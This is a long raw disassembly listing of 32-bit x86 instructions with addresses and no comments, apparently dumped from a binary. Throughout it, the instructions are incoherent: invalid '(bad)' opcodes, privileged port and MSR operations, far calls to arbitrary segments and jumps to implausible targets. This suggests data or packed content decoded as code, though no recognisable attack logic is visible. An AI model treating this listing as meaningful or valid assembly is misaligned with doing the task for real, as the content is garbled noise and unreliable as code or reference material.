  41aa10:	sbb    DWORD PTR [ebx],ebp
  41aa12:	int3   
  41aa13:	ja     0x41a99b
  41aa15:	ja     0x41a9d7
  41aa17:	adc    eax,0xb17d590d
  41aa1c:	mov    ch,0x31
  41aa1e:	xchg   esi,esi
  41aa20:	mov    esp,DWORD PTR [edx-0x43]
  41aa23:	jmp    0x41aa93
  41aa25:	lahf   
  41aa26:	test   BYTE PTR [esi-0x49],al
  41aa29:	push   0x90d93531
  41aa2e:	sub    esi,DWORD PTR [edx-0x5d]
  41aa31:	jecxz  0x41aa68
  41aa33:	sahf   
  41aa34:	xor    ecx,DWORD PTR [ebx-0x61e634b]
  41aa3a:	ret    
  41aa3b:	add    BYTE PTR ds:0x127b1b87,0x6d
  41aa42:	lods   eax,DWORD PTR ds:[esi]
  41aa43:	push   esi
  41aa44:	lods   al,BYTE PTR ds:[esi]
  41aa45:	sbb    eax,DWORD PTR [esi+ebx*1]
  41aa48:	repnz mov al,0x87
  41aa4b:	je     0x41aa9b
  41aa4d:	cmp    al,0xf5
  41aa4f:	hlt    
  41aa50:	mov    ds,WORD PTR [esi-0x69]
  41aa53:	jg     0x41aa85
  41aa55:	jge    0x41aad6
  41aa57:	aaa    
  41aa58:	inc    esp
  41aa59:	or     ebp,ebx
  41aa5b:	aam    0xbb
  41aa5d:	ficom  WORD PTR ds:0xc6760aa3
  41aa63:	cwde   
  41aa64:	xchg   edx,eax
  41aa65:	jl     0x41aa9d
  41aa67:	push   eax
  41aa68:	test   BYTE PTR [esi],bh
  41aa6a:	jl     0x41aa63
  41aa6c:	mov    BYTE PTR [edi+0x20],ah
  41aa6f:	or     eax,0x9afa8cf
  41aa74:	into   
  41aa75:	dec    edi
  41aa76:	jmp    0x41aa2f
  41aa78:	xchg   edi,eax
  41aa79:	sub    al,0x2b
  41aa7b:	aas    
  41aa7c:	das    
  41aa7d:	adc    al,0x65
  41aa7f:	jp     0x41aabb
  41aa81:	outs   dx,DWORD PTR ds:[esi]
  41aa82:	daa    
  41aa83:	pop    eax
  41aa84:	lock lock push ebx
  41aa87:	mov    dh,0x9c
  41aa89:	mov    al,0x4
  41aa8b:	xchg   esi,eax
  41aa8c:	arpl   WORD PTR [ecx-0x7bbdb401],cx
  41aa92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa93:	mov    esp,0x888af62
  41aa98:	dec    ebp
  41aa99:	(bad)  
  41aa9a:	retf   
  41aa9b:	or     eax,0x15df04d8
  41aaa0:	fsubp  st(4),st
  41aaa2:	pop    ss
  41aaa3:	inc    edi
  41aaa4:	in     al,0x9a
  41aaa6:	adc    DWORD PTR [ebp-0x61],ecx
  41aaa9:	xchg   esi,eax
  41aaaa:	jecxz  0x41aa87
  41aaac:	dec    ebx
  41aaad:	std    
  41aaae:	and    eax,0xce71d98f
  41aab3:	bound  ebx,QWORD PTR [ebx]
  41aab5:	les    eax,FWORD PTR [edx]
  41aab7:	jae    0x41aad7
  41aab9:	cmp    eax,0xfde773ba
  41aabe:	add    al,0x21
  41aac0:	mov    ds:0x9694b9b1,al
  41aac5:	sbb    eax,0x9df994d7
  41aaca:	gs mov ch,0x41
  41aacd:	xor    al,0xd0
  41aacf:	lods   eax,DWORD PTR ds:[esi]
  41aad0:	mov    eax,0x41871351
  41aad5:	push   es
  41aad6:	xlat   BYTE PTR ds:[ebx]
  41aad7:	push   cs
  41aad8:	into   
  41aad9:	push   0x7b999eaa
  41aade:	mov    dh,0xfa
  41aae0:	inc    ebx
  41aae1:	inc    esp
  41aae2:	inc    edi
  41aae3:	xchg   esp,eax
  41aae4:	jbe    0x41aab8
  41aae6:	lock cmp al,0x87
  41aae9:	test   DWORD PTR [ebx],ebp
  41aaeb:	pushf  
  41aaec:	mov    ds:0x4bcf9580,eax
  41aaf1:	xor    DWORD PTR [edi],0x1d
  41aaf4:	mov    esi,0x5a6b5f46
  41aaf9:	cmp    al,0xd1
  41aafb:	adc    bl,0xbc
  41aafe:	and    eax,0xc5525fd0
  41ab03:	scas   eax,DWORD PTR es:[edi]
  41ab04:	jl     0x41ab24
  41ab06:	pop    es
  41ab07:	cld    
  41ab08:	and    eax,0x85ace04e
  41ab0d:	adc    al,0x86
  41ab0f:	outs   dx,DWORD PTR ds:[esi]
  41ab10:	sub    BYTE PTR [eax],dh
  41ab12:	cld    
  41ab13:	mov    ebx,0x908c58ce
  41ab18:	imul   ebp,DWORD PTR [esi-0x3],0x4c
  41ab1c:	int3   
  41ab1d:	push   esp
  41ab1e:	or     al,0x67
  41ab20:	sub    al,BYTE PTR [ebp+0x6f]
  41ab23:	test   al,0x58
  41ab25:	jl     0x41ab1b
  41ab27:	mov    eax,ds:0xa92c8b1a
  41ab2c:	stc    
  41ab2d:	xchg   DWORD PTR [ecx],esi
  41ab2f:	xchg   edx,eax
  41ab30:	adc    al,0xce
  41ab32:	mov    edi,0xa97da325
  41ab37:	cmp    ebp,DWORD PTR [ecx+0x59]
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0xdfe1cabe
  41ab52:	dec    ebp
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab2d
  41ab5c:	xor    eax,0x4b7ffeff
  41ab61:	sbb    BYTE PTR [esi+edx*4],al
  41ab64:	sbb    ebp,esp
  41ab66:	inc    ebp
  41ab67:	and    dh,BYTE PTR [ecx-0x56]
  41ab6a:	retf   
  41ab6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab6c:	enter  0xccbf,0xfb
  41ab70:	mov    cl,0x92
  41ab72:	mov    ecx,0x60d78440
  41ab77:	mov    ebx,0xe2f9f36a
  41ab7c:	cli    
  41ab7d:	xor    al,0x54
  41ab7f:	cmp    DWORD PTR [ecx+edi*8],ebp
  41ab82:	cmp    cl,BYTE PTR [ebx+0x1c]
  41ab85:	pop    ecx
  41ab86:	sbb    al,0x69
  41ab88:	or     DWORD PTR [eax+0x269811d8],edx
  41ab8e:	xchg   di,ax
  41ab90:	je     0x41abb6
  41ab92:	jg     0x41ab3a
  41ab94:	add    DWORD PTR [esi-0x13],esi
  41ab97:	leave  
  41ab98:	push   esp
  41ab99:	dec    esi
  41ab9a:	fild   WORD PTR [eax-0x15f2c512]
  41aba0:	cdq    
  41aba1:	int3   
  41aba2:	(bad)  
  41aba3:	mov    ecx,0x1d3dd966
  41aba8:	aaa    
  41aba9:	shl    dh,cl
  41abab:	out    0x2e,al
  41abad:	repnz xor DWORD PTR [edx],esp
  41abb0:	retf   0x5744
  41abb3:	jnp    0x41abcd
  41abb5:	mov    DWORD PTR [ebx-0x66bf922a],ebx
  41abbb:	sbb    eax,0x881efc8
  41abc0:	xchg   ecx,eax
  41abc1:	sub    DWORD PTR [ebx-0x34],eax
  41abc4:	pop    ss
  41abc5:	mov    esp,0x3cb584ce
  41abca:	neg    BYTE PTR [edi-0x22ab6375]
  41abd0:	mul    BYTE PTR [ebx+0x5066b957]
  41abd6:	sbb    al,0xb8
  41abd8:	imul   esi,esp,0xb0232004
  41abde:	and    eax,0x973879ff
  41abe3:	psubq  mm5,mm6
  41abe6:	hlt    
  41abe7:	fisubr DWORD PTR cs:[ecx]
  41abea:	fwait
  41abeb:	cmp    cl,BYTE PTR [ebp-0x3b1a6186]
  41abf1:	test   al,0xd4
  41abf3:	pop    ecx
  41abf4:	xchg   esp,eax
  41abf5:	mov    al,BYTE PTR [ebp+0x26]
  41abf8:	jne    0x41ac2e
  41abfa:	sub    ebx,ecx
  41abfc:	sahf   
  41abfd:	adc    eax,0xbe13bc8d
  41ac02:	xor    eax,0x1a9ee9aa
  41ac07:	stos   BYTE PTR es:[edi],al
  41ac08:	rcl    BYTE PTR [eax-0x2],0x89
  41ac0c:	int3   
  41ac0d:	pop    ss
  41ac0e:	mov    ecx,edx
  41ac10:	jp     0x41ac83
  41ac12:	and    BYTE PTR [edx+0x8950876],0xdd
  41ac19:	lea    ecx,ds:0xf220854a
  41ac1f:	fldcw  WORD PTR [esi-0x1c62a84d]
  41ac25:	loope  0x41ac1e
  41ac27:	addr16 mov ebp,ecx
  41ac2a:	or     ah,cl
  41ac2c:	push   ebp
  41ac2d:	bnd jmp 0xbb70b368
  41ac33:	push   ebx
  41ac34:	jnp    0x41ac0b
  41ac36:	pop    ss
  41ac37:	leave  
  41ac38:	adc    eax,0x78a9746f
  41ac3d:	dec    edx
  41ac3e:	xchg   esi,eax
  41ac3f:	xlat   BYTE PTR ds:[ebx]
  41ac40:	into   
  41ac41:	sub    edx,ebx
  41ac43:	fstp   QWORD PTR [ecx+0x24b24c72]
  41ac49:	jmp    0x41abea
  41ac4b:	mov    dl,0xd6
  41ac4d:	lock aad 0xe2
  41ac50:	jle    0x41aca8
  41ac52:	sbb    al,0xc2
  41ac54:	pop    ebx
  41ac55:	mov    dh,0x99
  41ac57:	pop    edx
  41ac58:	add    ah,bh
  41ac5a:	shr    edi,0x46
  41ac5d:	loop   0x41acd2
  41ac5f:	loope  0x41ac43
  41ac61:	int3   
  41ac62:	das    
  41ac63:	in     eax,0x75
  41ac65:	mov    esp,0x65246be0
  41ac6a:	xor    cl,bh
  41ac6c:	outs   dx,BYTE PTR ds:[esi]
  41ac6d:	enter  0xc087,0xbd
  41ac71:	(bad)  
  41ac72:	out    0x4d,al
  41ac74:	out    dx,eax
  41ac75:	test   DWORD PTR [ebx],esi
  41ac77:	jle    0x41ac8d
  41ac79:	mov    DWORD PTR [edi],edx
  41ac7b:	gs dec esi
  41ac7d:	inc    ebp
  41ac7e:	fild   QWORD PTR [edx-0x6028c9b7]
  41ac84:	popa   
  41ac85:	jl     0x41ac70
  41ac87:	xchg   edi,eax
  41ac88:	jns    0x41ac30
  41ac8a:	push   ds
  41ac8b:	adc    al,0xb
  41ac8d:	sub    ebp,0x11
  41ac90:	stc    
  41ac91:	mov    dh,0x3c
  41ac93:	jnp    0x41ad0b
  41ac95:	std    
  41ac96:	mov    ebp,0xc8feef40
  41ac9b:	sbb    eax,0xb7d0fa7a
  41aca0:	jae    0x41ac31
  41aca2:	xlat   BYTE PTR ds:[ebx]
  41aca3:	call   0x5eba:0xba28ee7
  41acaa:	dec    eax
  41acab:	mov    ecx,ebp
  41acad:	ret    
  41acae:	add    bl,BYTE PTR [eax-0x1877ab09]
  41acb4:	cld    
  41acb5:	add    eax,0x73140e12
  41acba:	into   
  41acbb:	test   al,0x3a
  41acbd:	pop    edi
  41acbe:	(bad)  
  41acbf:	pop    ebx
  41acc0:	dec    ebp
  41acc1:	pop    esp
  41acc2:	xchg   esi,eax
  41acc3:	out    0x2c,al
  41acc5:	iret   
  41acc6:	je     0x41acaf
  41acc8:	add    al,0x82
  41acca:	mov    eax,ds:0xd709a1b9
  41accf:	adc    BYTE PTR [ebp+0xe78ea50],0x4a
  41acd6:	adc    bh,BYTE PTR [ebp-0x60]
  41acd9:	sti    
  41acda:	cmp    BYTE PTR [edi+0x36555e73],0x58
  41ace1:	sub    eax,0x83c837f8
  41ace6:	(bad)  [eax+edi*1]
  41ace9:	pop    ebp
  41acea:	cmp    ebx,DWORD PTR [eax+0x7f]
  41aced:	imul   edi,esi,0x1f2343a9
  41acf3:	inc    ebp
  41acf4:	mov    esp,0x92fa85b5
  41acf9:	jae    0x41ac95
  41acfb:	mov    edi,esi
  41acfd:	mov    fs,ebp
  41acff:	sub    bh,BYTE PTR [ecx]
  41ad01:	lock fistp DWORD PTR [ebp-0x34d5ebf2]
  41ad08:	xor    eax,0x65456689
  41ad0d:	push   0xed74c4c3
  41ad12:	dec    ecx
  41ad13:	das    
  41ad14:	mov    esp,0xd6c057ae
  41ad19:	loop   0x41ad85
  41ad1b:	dec    esp
  41ad1d:	and    ecx,DWORD PTR [edi+ecx*1+0x3b]
  41ad21:	out    0x72,al
  41ad23:	mov    ebx,0xd62a9710
  41ad28:	push   esi
  41ad29:	xlat   BYTE PTR ds:[ebx]
  41ad2a:	(bad)  
  41ad2b:	or     al,0xed
  41ad2d:	mov    dh,0x21
  41ad2f:	add    eax,0xec5a9517
  41ad34:	pop    es
  41ad35:	pop    edx
  41ad36:	or     DWORD PTR [esi-0x61],esi
  41ad39:	jl     0x41ad07
  41ad3b:	dec    edx
  41ad3c:	ja     0x41ad94
  41ad3e:	js     0x41ad16
  41ad40:	lods   eax,DWORD PTR ds:[esi]
  41ad41:	jno    0x41ad58
  41ad43:	dec    ebp
  41ad44:	pop    es
  41ad45:	xor    al,al
  41ad47:	inc    edx
  41ad48:	in     al,dx
  41ad49:	ins    DWORD PTR es:[edi],dx
  41ad4a:	or     eax,0xf41652ce
  41ad4f:	and    DWORD PTR cs:[ebp+0x5d60babf],eax
  41ad56:	fild   DWORD PTR [ebx-0x585b8eaf]
  41ad5c:	cdq    
  41ad5d:	fbld   TBYTE PTR [esi]
  41ad5f:	fld    DWORD PTR [edx+0x44]
  41ad62:	bound  esp,QWORD PTR [esi]
  41ad64:	loop   0x41adbc
  41ad66:	jbe    0x41acf0
  41ad68:	and    ch,dh
  41ad6a:	fstp   DWORD PTR [ebx+0x6fe7e4bf]
  41ad70:	sub    BYTE PTR [ebx],al
  41ad72:	inc    BYTE PTR [edi-0x1626d435]
  41ad78:	xor    BYTE PTR [edx],al
  41ad7a:	add    BYTE PTR [eax],al
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x28d25295,eax
  41ad89:	push   esi
  41ad8a:	and    al,0x21
  41ad8c:	js     0x41ad66
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41ad7e
  41ad95:	leave  
  41ad96:	cmp    al,0xb5
  41ad98:	pop    edx
  41ad99:	sbb    DWORD PTR [ebp-0x4819dd7],0x5d
  41ada0:	test   eax,0xc4e8c97f
  41ada5:	popf   
  41ada6:	pop    edi
  41ada7:	cmp    dh,BYTE PTR [eiz*2+0x20449c15]
  41adae:	scas   al,BYTE PTR es:[edi]
  41adaf:	mov    ecx,0x44187430
  41adb4:	daa    
  41adb5:	and    BYTE PTR [edi-0x6a6bfc1d],dl
  41adbb:	js     0x41ad55
  41adbd:	mov    BYTE PTR ds:0x3f2c5e60,dl
  41adc3:	cmp    DWORD PTR [edi],edx
  41adc5:	sub    al,0x27
  41adc7:	loope  0x41ae15
  41adc9:	fsubp  st(7),st
  41adcb:	lahf   
  41adcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adcd:	fidivr DWORD PTR [esi+0x67]
  41add0:	mov    ds:0x6eb895cf,al
  41add5:	inc    ecx
  41add6:	repnz mov edx,gs
  41add9:	call   0x5bfa:0xbd685c59
  41ade0:	test   al,0xdc
  41ade2:	or     BYTE PTR [ebx],ch
  41ade4:	or     edx,DWORD PTR [ebx]
  41ade6:	imul   ecx,DWORD PTR [ebp+ebx*2-0x71e0dab7],0x29a6cdc1
  41adf1:	loopne 0x41ae35
  41adf3:	loope  0x41ade9
  41adf5:	repnz ins DWORD PTR es:[edi],dx
  41adf7:	and    DWORD PTR [eax],ebp
  41adf9:	mov    ebx,DWORD PTR [eax]
  41adfb:	in     eax,0xce
  41adfd:	cmp    al,0x58
  41adff:	xchg   esp,eax
  41ae00:	xchg   BYTE PTR [edx-0x19],dh
  41ae03:	cmc    
  41ae04:	call   0xb4cbcdf4
  41ae09:	push   ebx
  41ae0a:	adc    edi,DWORD PTR es:[ebx-0x482826aa]
  41ae11:	dec    ebx
  41ae12:	stc    
  41ae13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae14:	jmp    0xf573c4fa
  41ae19:	cwde   
  41ae1a:	xchg   ebx,eax
  41ae1b:	sbb    eax,0x76c5c85e
  41ae20:	inc    ebx
  41ae21:	cmp    eax,0x9fefa8be
  41ae26:	lods   eax,DWORD PTR ds:[esi]
  41ae27:	push   edx
  41ae28:	inc    esp
  41ae29:	inc    ebx
  41ae2a:	ret    0x42eb
  41ae2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae2e:	sub    BYTE PTR [ebp-0x65],cl
  41ae31:	retf   0x5e29
  41ae34:	mov    dl,0x31
  41ae36:	dec    esi
  41ae37:	sub    al,0xd8
  41ae39:	cli    
  41ae3a:	mov    esi,0xc8c3ac01
  41ae3f:	add    BYTE PTR [eax+ebp*2],dl
  41ae42:	fcmove st,st(6)
  41ae44:	push   esi
  41ae45:	inc    edi
  41ae46:	dec    edi
  41ae47:	dec    edx
  41ae48:	loopne 0x41aeb0
  41ae4a:	jae    0x41add9
  41ae4c:	mov    dh,0xe0
  41ae4e:	dec    DWORD PTR [eax+esi*1]
  41ae51:	mov    eax,ds:0x3ecc22ea
  41ae56:	mul    BYTE PTR [ebx+0x12ba5b0d]
  41ae5c:	jmp    0xfed52a00
  41ae61:	mov    dh,0xf6
  41ae63:	daa    
  41ae64:	loopne 0x41ae98
  41ae66:	pusha  
  41ae67:	popa   
  41ae68:	es mov ebp,0x44640c04
  41ae6e:	mov    edi,gs
  41ae70:	lock mov dl,0xd4
  41ae73:	aad    0x37
  41ae75:	sti    
  41ae76:	or     eax,0x572431ef
  41ae7b:	xchg   DWORD PTR [eax+0x66],edi
  41ae7e:	push   ebp
  41ae7f:	jg     0x41af00
  41ae81:	inc    esi
  41ae82:	les    esi,FWORD PTR [eax+0x32]
  41ae85:	push   ebp
  41ae86:	fst    QWORD PTR [ecx]
  41ae88:	xor    DWORD PTR [esi+0x3c],esp
  41ae8b:	push   ebp
  41ae8c:	inc    ebx
  41ae8d:	dec    ebp
  41ae8e:	lods   eax,DWORD PTR ds:[esi]
  41ae8f:	stos   DWORD PTR es:[edi],eax
  41ae90:	mov    ebx,0x8e6bc4e
  41ae95:	jmp    0xfabbbb35
  41ae9a:	arpl   sp,dx
  41ae9c:	dec    edi
  41ae9d:	lahf   
  41ae9e:	mov    esi,DWORD PTR [ebx-0x47]
  41aea1:	mov    esp,0x4efd1287
  41aea6:	test   eax,0x612d1b11
  41aeab:	add    BYTE PTR [ebp+0x28a9744c],al
  41aeb1:	mov    bh,0x3c
  41aeb3:	jmp    0x41ae43
  41aeb5:	call   0x4bfc:0x1c533038
  41aebc:	add    eax,0x3a59eafe
  41aec1:	ins    BYTE PTR es:[edi],dx
  41aec2:	arpl   WORD PTR [eax+0x1dd7b21c],dx
  41aec8:	mov    bl,0x56
  41aeca:	sbb    DWORD PTR [ecx],ebp
  41aecc:	call   0xa2f1:0x7ce1843e
  41aed3:	neg    ebx
  41aed5:	adc    DWORD PTR [edx-0x4d8c14af],0x79a3e510
  41aedf:	in     al,dx
  41aee0:	or     al,0x44
  41aee2:	(bad)
  41aee6:	push   edi
  41aee7:	push   0xffffffb8
  41aee9:	sbb    BYTE PTR [edx+0x25a4881a],dh
  41aeef:	loop   0x41aecc
  41aef1:	pop    es
  41aef2:	push   esp
  41aef3:	mov    ds:0x27aad35e,eax
  41aef8:	icebp  
  41aef9:	test   eax,0x520436be
  41aefe:	rol    ebp,1
  41af00:	add    al,0x9d
  41af02:	sub    edi,DWORD PTR [ebx]
  41af04:	xchg   ebp,eax
  41af05:	out    dx,al
  41af06:	inc    esp
  41af07:	rol    esi,0xd0
  41af0a:	fld    QWORD PTR [ebx+0x4a]
  41af0d:	loope  0x41aea5
  41af0f:	mov    eax,0xc246a40b
  41af14:	adc    ecx,DWORD PTR [esi+ebp*4]
  41af17:	jnp    0x41aefd
  41af19:	(bad)  
  41af1a:	mov    eax,ds:0x86acfc81
  41af1f:	and    cl,BYTE PTR [edi+0x16]
  41af22:	fld    QWORD PTR [ecx-0x6d]
  41af25:	cdq    
  41af26:	xchg   edx,eax
  41af27:	add    DWORD PTR [esi],ebx
  41af29:	repz cmp BYTE PTR [ebx+edi*1-0x466db67f],bl
  41af31:	loop   0x41af09
  41af33:	xchg   esp,eax
  41af34:	sub    DWORD PTR [ebp+ebx*2-0x38a101d5],edi
  41af3b:	add    DWORD PTR [esi+0x162e0b61],edx
  41af41:	cmp    BYTE PTR [edx],al
  41af43:	pop    edi
  41af44:	ret    0xfeed
  41af47:	and    cl,BYTE PTR ss:[edi+0x417f4e0]
  41af4e:	adc    eax,0x74d4d484
  41af53:	mov    dl,BYTE PTR [ebx+eiz*8-0x4c40a428]
  41af5a:	lea    ebp,[eax]
  41af5c:	pcmpeqw mm1,QWORD PTR [ebx+0x1c80d1fe]
  41af63:	adc    edi,ebp
  41af65:	xchg   ecx,eax
  41af66:	or     bh,BYTE PTR [ebx-0x2b]
  41af69:	pop    si
  41af6b:	aam    0x9e
  41af6d:	push   es
  41af6e:	mov    eax,ds:0xbab50a4c
  41af73:	or     ebx,DWORD PTR [edx+0x3d80e928]
  41af79:	es dec edi
  41af7b:	push   edx
  41af7c:	adc    BYTE PTR [ecx+esi*2-0x4d],cl
  41af80:	out    0xed,al
  41af82:	push   ds
  41af83:	repnz loope 0x41af2d
  41af86:	stos   DWORD PTR es:[edi],eax
  41af87:	lods   eax,DWORD PTR ds:[esi]
  41af88:	or     al,0x81
  41af8a:	test   al,0x66
  41af8c:	jmp    FWORD PTR [ebx+esi*1+0x5d]
  41af90:	push   ebx
  41af91:	add    DWORD PTR ds:0x4972cb6e,esi
  41af98:	jle    0x41afe7
  41af9a:	lahf   
  41af9b:	ror    DWORD PTR [edx],cl
  41af9d:	add    DWORD PTR [ebx-0x43c589eb],edi
  41afa3:	lods   al,BYTE PTR ds:[esi]
  41afa4:	in     al,0x7
  41afa6:	retf   
  41afa7:	jnp    0x41af81
  41afa9:	clc    
  41afaa:	es xchg bx,cx
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi-0x3be7effd]
  41afc0:	cli    
  41afc1:	push   ebx
  41afc2:	bound  edx,QWORD PTR [eax]
  41afc4:	fidivr WORD PTR [edi+0x78]
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41afe3
  41afcc:	into   
  41afcd:	fstp   TBYTE PTR [edi-0x6c]
  41afd0:	mov    ebx,0x856bb4c5
  41afd5:	data16 mov ch,0x34
  41afd8:	sbb    bl,0xc5
  41afdb:	shl    BYTE PTR [edx+0x63309388],1
  41afe1:	jecxz  0x41afc9
  41afe3:	or     DWORD PTR [ecx+edx*8-0x310b61],edx
  41afea:	in     al,0x8a
  41afec:	jnp    0x41af9b
  41afee:	adc    BYTE PTR [edi-0x177fb1b7],ch
  41aff4:	jno    0x41af9d
  41aff6:	and    esi,DWORD PTR [ebp+0x4021e7bd]
  41affc:	xlat   BYTE PTR ds:[ebx]
  41affd:	lock jb 0x41afb5
  41b000:	or     ah,BYTE PTR [ebp-0x6e]
  41b003:	xor    BYTE PTR [edi+0xe],bl
  41b006:	inc    edi
  41b007:	out    0xfa,eax
  41b009:	add    bl,bh
  41b00b:	adc    DWORD PTR [edx+0x492f673e],ebx
  41b011:	dec    esi
  41b012:	call   0xa299:0xa889516a
  41b019:	enter  0x1909,0xab
  41b01d:	sti    
  41b01e:	mov    ch,0x75
  41b020:	mov    ss,WORD PTR [edx]
  41b022:	test   al,0xfa
  41b024:	into   
  41b025:	enter  0x134c,0xdd
  41b029:	mov    eax,0xf207482d
  41b02e:	icebp  
  41b02f:	aas    
  41b030:	sbb    esp,DWORD PTR [edx]
  41b032:	outs   dx,BYTE PTR ds:[esi]
  41b033:	mov    al,ds:0x969816ab
  41b038:	mov    cl,0xe9
  41b03a:	sbb    ecx,DWORD PTR [edi+0x7641631]
  41b040:	pop    ss
  41b041:	jne    0x41afef
  41b043:	test   dl,ch
  41b045:	or     eax,0xee6e835e
  41b04a:	xchg   edi,eax
  41b04b:	xchg   ebp,ebp
  41b04d:	int    0xab
  41b04f:	jne    0x41b0cb
  41b051:	jle    0x41b0ab
  41b053:	mov    al,0x97
  41b055:	adc    eax,0x61aa6ad2
  41b05a:	push   es
  41b05b:	sbb    eax,0x242ec350
  41b060:	es jl  0x41b0b6
  41b063:	push   esi
  41b064:	cmp    al,0xe7
  41b066:	jecxz  0x41b039
  41b068:	adc    DWORD PTR [ebp+edx*2+0x72d27cd0],ebp
  41b06f:	cmp    BYTE PTR [edx+0x63595b97],0xbd
  41b076:	mov    ecx,0xbfa4baec
  41b07b:	lods   eax,DWORD PTR ds:[esi]
  41b07c:	rdmsr  
  41b07e:	in     al,dx
  41b07f:	jmp    0x43b2:0x4a8c006b
  41b086:	adc    al,BYTE PTR [ebx]
  41b088:	rcr    ebx,0xd2
  41b08b:	jne    0x41b0ab
  41b08d:	push   edx
  41b08e:	mov    esp,0x4ef1ed2d
  41b093:	scas   eax,DWORD PTR es:[edi]
  41b094:	dec    ebx
  41b095:	imul   ebx,DWORD PTR [edx],0xffffff80
  41b098:	mov    bh,0x6f
  41b09a:	iret   
  41b09b:	mul    bh
  41b09d:	imul   esi,DWORD PTR [edi-0x23f3e9e0],0xfffffff0
  41b0a4:	pop    es
  41b0a5:	cmp    bl,BYTE PTR [esi]
  41b0a7:	mov    dl,0xa
  41b0a9:	push   ebx
  41b0aa:	bound  esi,QWORD PTR [edi+ebp*2+0x327cba9c]
  41b0b1:	jb     0x41b07f
  41b0b3:	call   0xafcbea16
  41b0b8:	inc    BYTE PTR fs:[edx-0x68dcbe2e]
  41b0bf:	std    
  41b0c0:	in     eax,0x28
  41b0c2:	push   eax
  41b0c3:	iret   
  41b0c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0c6:	xchg   esp,eax
  41b0c7:	cmp    ebp,ecx
  41b0c9:	aas    
  41b0ca:	clc    
  41b0cb:	arpl   WORD PTR [ebx],bp
  41b0cd:	repnz repz push edi
  41b0d0:	(bad)  
  41b0d1:	pop    ss
  41b0d2:	sub    BYTE PTR [esi],ah
  41b0d4:	leave  
  41b0d5:	sub    edi,DWORD PTR ds:0x778334bb
  41b0db:	mov    cl,0xd1
  41b0dd:	and    edi,DWORD PTR [edx-0x588e8059]
  41b0e3:	pop    ebp
  41b0e4:	mov    esi,0xee42d9b2
  41b0e9:	add    ebx,DWORD PTR [ecx-0x3bea06d9]
  41b0ef:	pop    ebx
  41b0f0:	(bad)  
  41b0f1:	and    BYTE PTR [edx],ah
  41b0f3:	pop    edi
  41b0f4:	adc    al,0x33
  41b0f6:	out    dx,eax
  41b0f7:	sub    edx,ebx
  41b0f9:	pop    eax
  41b0fa:	mov    esi,0x97cf2395
  41b0ff:	mov    esp,0x8f5ed258
  41b104:	in     eax,dx
  41b105:	mov    eax,ds:0x708d0623
  41b10a:	inc    BYTE PTR [ebx]
  41b10c:	xor    BYTE PTR [edi+esi*2-0x14b2268c],bh
  41b113:	sub    edx,DWORD PTR ds:0x7cbc3eb9
  41b119:	xor    DWORD PTR [eax],edi
  41b11b:	out    dx,eax
  41b11c:	mov    cl,0xaa
  41b11e:	cmp    BYTE PTR [ecx-0x307e7dfe],bh
  41b124:	lea    edx,[ebx-0x57]
  41b127:	xchg   ebp,eax
  41b128:	dec    esp
  41b129:	loopne 0x41b186
  41b12b:	adc    al,0x94
  41b12d:	leave  
  41b12e:	test   BYTE PTR [edi-0xd5850d6],ch
  41b134:	arpl   WORD PTR [eax-0x40],bx
  41b137:	xor    eax,0x52f8e8d9
  41b13c:	push   es
  41b13d:	inc    DWORD PTR [ebp-0x6d]
  41b140:	cwde   
  41b141:	or     ah,BYTE PTR [edi+edi*8]
  41b144:	jecxz  0x41b121
  41b146:	push   esi
  41b147:	lods   eax,DWORD PTR ds:[esi]
  41b148:	cli    
  41b149:	jmp    0x8a4c5bbf
  41b14e:	mov    ecx,0x5c6cace6
  41b153:	(bad)  
  41b154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b155:	test   eax,0x45f70c00
  41b15a:	xlat   BYTE PTR ds:[ebx]
  41b15b:	mov    esp,0x364256c4
  41b160:	in     al,dx
  41b161:	mov    al,ds:0x4af58dc9
  41b166:	mov    bl,0x86
  41b168:	cmp    ah,BYTE PTR [ebx-0x15]
  41b16b:	pop    esi
  41b16c:	ins    BYTE PTR es:[edi],dx
  41b16d:	jb     0x41b128
  41b16f:	ja     0x41b198
  41b171:	ss push cs
  41b173:	push   0x209f28a2
  41b178:	xor    esi,0x5d152cd2
  41b17e:	test   eax,0xf3bc5de6
  41b183:	arpl   WORD PTR [ebx-0x7d],dx
  41b186:	jns    0x41b1c1
  41b188:	mov    BYTE PTR ds:0x4787e23e,cl
  41b18e:	cmp    al,0x70
  41b190:	mov    dh,0x2d
  41b192:	mov    ebx,0xa306d44c
  41b197:	(bad)  
  41b199:	ror    DWORD PTR [edi],0x6
  41b19c:	inc    ecx
  41b19d:	loopne 0x41b21e
  41b19f:	push   ss
  41b1a0:	add    ch,dl
  41b1a2:	xor    eax,0x392e2c93
  41b1a7:	inc    ebx
  41b1a8:	in     al,0x88
  41b1aa:	mov    bl,BYTE PTR [ebp-0x106aba0]
  41b1b0:	pop    esi
  41b1b1:	ficom  DWORD PTR [eax]
  41b1b3:	ja     0x41b147
  41b1b5:	sub    eax,0xbe7edc5b
  41b1ba:	mov    ebx,ecx
  41b1bc:	or     dl,BYTE PTR [edi-0x360576c0]
  41b1c2:	int3   
  41b1c3:	into   
  41b1c4:	out    dx,al
  41b1c5:	ss jae 0x41b173
